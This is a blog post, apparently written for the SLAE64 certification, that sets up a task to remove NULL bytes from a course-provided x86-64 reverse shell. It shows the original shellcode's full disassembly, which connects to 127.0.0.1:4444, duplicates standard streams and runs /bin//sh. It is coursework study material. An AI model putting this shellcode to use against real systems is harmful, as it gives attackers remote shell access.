---
layout: post
title: Null-Free Reverse Shell
date: 2021-01-19 20:30:00
categories: posts
comments: false
en: true
---

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification.

A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind Shell, arranging a specific 
connection on a trivial address, instead of binding the compromised device into a certain port. Furthermore, after the connection is established, a shell is executed, granting 
interaction to the attacker.

The first assignment from the seven is divided in two sections:

+ A: Requires the creation of a Reverse Shell with password protection through the Assembly language, and converting such into shellcode. 
+ B: Requires the alteration of the provided Reverse Shell during the course, in order that it no longer possesses any form of NULL bytes (00). 

Due to the reason that in the [previous](https://whitecr0wz.github.io/posts/SLAE64-Reverse-Password/) post the first section of the exercise was tackled, this post will be focused 
towards the secondary task.

Let's analyze the Reverse Shell given during the course:

```term
hitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$ objdump -D 1.o -M intel 

1.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   b8 29 00 00 00          mov    eax,0x29
   5:   bf 02 00 00 00          mov    edi,0x2
   a:   be 01 00 00 00          mov    esi,0x1
   f:   ba 00 00 00 00          mov    edx,0x0
  14:   0f 05                   syscall 
  16:   48 89 c7                mov    rdi,rax
  19:   48 31 c0                xor    rax,rax
  1c:   50                      push   rax
  1d:   c7 44 24 fc 7f 00 00    mov    DWORD PTR [rsp-0x4],0x100007f
  24:   01 
  25:   66 c7 44 24 fa 11 5c    mov    WORD PTR [rsp-0x6],0x5c11
  2c:   66 c7 44 24 f8 02 00    mov    WORD PTR [rsp-0x8],0x2
  33:   48 83 ec 08             sub    rsp,0x8
  37:   b8 2a 00 00 00          mov    eax,0x2a
  3c:   48 89 e6                mov    rsi,rsp
  3f:   ba 10 00 00 00          mov    edx,0x10
  44:   0f 05                   syscall 
  46:   b8 21 00 00 00          mov    eax,0x21
  4b:   be 00 00 00 00          mov    esi,0x0
  50:   0f 05                   syscall 
  52:   b8 21 00 00 00          mov    eax,0x21
  57:   be 01 00 00 00          mov    esi,0x1
  5c:   0f 05                   syscall 
  5e:   b8 21 00 00 00          mov    eax,0x21
  63:   be 02 00 00 00          mov    esi,0x2
  68:   0f 05                   syscall 
  6a:   48 31 c0                xor    rax,rax
  6d:   50                      push   rax
  6e:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
  75:   2f 73 68 
  78:   53                      push   rbx
  79:   48 89 e7                mov    rdi,rsp
  7c:   50                      push   rax
  7d:   48 89 e2                mov    rdx,rsp
  80:   57                      push   rdi
  81:   48 89 e6                mov    rsi,rsp
  84:   48 83 c0 3b             add    rax,0x3b
  88:   0f 05                   syscall 
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$
```

